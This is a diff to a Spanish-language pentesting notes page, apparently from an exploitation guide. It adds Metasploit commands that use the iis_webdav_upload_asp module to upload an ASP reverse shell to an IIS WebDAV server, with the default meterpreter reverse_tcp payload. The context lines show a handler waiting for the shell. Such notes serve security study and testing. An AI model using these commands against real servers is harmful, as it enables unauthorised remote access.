@@ -99,4 +99,17 @@ msf exploit(multi/handler)> run
 
 En este punto, `metasploit` queda esperando a que el payload se ejecute en el objetivo para crear la shell. Para ello simplemente accedemos a el mediante un navegador: `http://host/webdav/reverse.asp`
 
+También podemos automatizar todo el proceso:
+
+```bash
+msf > use exploit/windows/iis/iis_webdav_upload_asp
+msf exploit(windows/iis/iis_webdav_upload_asp)> set httpusername usr
+msf exploit(windows/iis/iis_webdav_upload_asp)> set httppassword pass
+msf exploit(windows/iis/iis_webdav_upload_asp)> run
+```
+
+> Notas:
+> Se muestran las opciones principales pero puede ser necesario configurar IPs y puertos.
+> Este módulo usa por defecto como payload `windows/meterpreter/reverse_tcp` pero puede cambiarse si es necesario.
+
 [⟵ Anterior](../../05_sistema.md#explotación-windows)
